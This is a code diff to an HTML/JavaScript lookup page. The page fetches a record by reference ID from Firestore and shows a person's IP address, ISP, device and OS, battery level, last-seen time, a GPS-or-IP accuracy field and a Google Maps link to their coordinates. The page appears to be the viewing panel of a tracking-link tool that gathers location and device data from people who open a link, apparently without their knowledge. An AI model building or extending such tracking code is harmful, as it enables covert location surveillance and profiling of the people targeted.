@@ -15,7 +15,7 @@
         .row { display: flex; border-bottom: 1px solid #eee; padding: 15px; }
         .label { font-weight: bold; width: 30%; color: #333; }
         .value { width: 70%; color: #555; word-break: break-all; }
-        .map-link { color: #d32f2f; text-decoration: none; font-weight: bold; }
+        .map-link { color: #d32f2f; text-decoration: none; font-weight: bold; font-size: 1.1em; }
     </style>
 </head>
 <body>
@@ -24,17 +24,15 @@
 
     <div class="search-box">
         <input type="text" id="refIdInput" placeholder="Enter Ref ID">
-        <input type="text" placeholder="Your WhatsApp (Optional)">
         <button onclick="fetchInfo()">Search</button>
     </div>
 
     <div id="result-area">
+        <div class="row"><div class="label">Accuracy</div><div class="value" id="disp_acc" style="color: green; font-weight: bold;">...</div></div>
+        <div class="row"><div class="label">Map</div><div class="value"><a href="#" id="disp_map" target="_blank" class="map-link">📍 Open Google Maps</a></div></div>
         <div class="row"><div class="label">IP Address</div><div class="value" id="disp_ip">...</div></div>
-        <div class="row"><div class="label">Map</div><div class="value"><a href="#" id="disp_map" target="_blank" class="map-link">📍 Open Map</a></div></div>
         <div class="row"><div class="label">ISP</div><div class="value" id="disp_isp">...</div></div>
         <div class="row"><div class="label">Device</div><div class="value" id="disp_device">...</div></div>
-        <div class="row"><div class="label">OS</div><div class="value" id="disp_os">...</div></div>
-        <div class="row"><div class="label">Browser</div><div class="value" id="disp_browser">...</div></div>
         <div class="row"><div class="label">Battery</div><div class="value" id="disp_battery">...</div></div>
         <div class="row"><div class="label">Last Updated</div><div class="value" id="disp_time">...</div></div>
     </div>
@@ -55,14 +53,15 @@
 
                 if (docSnap.exists()) {
                     const data = docSnap.data();
+                    
+                    document.getElementById('disp_acc').innerText = data.accuracy || "Approx IP"; // Shows if GPS or IP
                     document.getElementById('disp_ip').innerText = data.ip;
                     document.getElementById('disp_isp').innerText = data.isp;
-                    document.getElementById('disp_device').innerText = data.device;
-                    document.getElementById('disp_os').innerText = data.os;
-                    document.getElementById('disp_browser').innerText = data.browser;
+                    document.getElementById('disp_device').innerText = data.device + " (" + data.os + ")";
                     document.getElementById('disp_battery').innerText = data.battery;
                     document.getElementById('disp_time').innerText = data.lastUpdated;
                     
+                    // Fixed Map Link logic
                     const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
                     document.getElementById('disp_map').href = mapUrl;
 
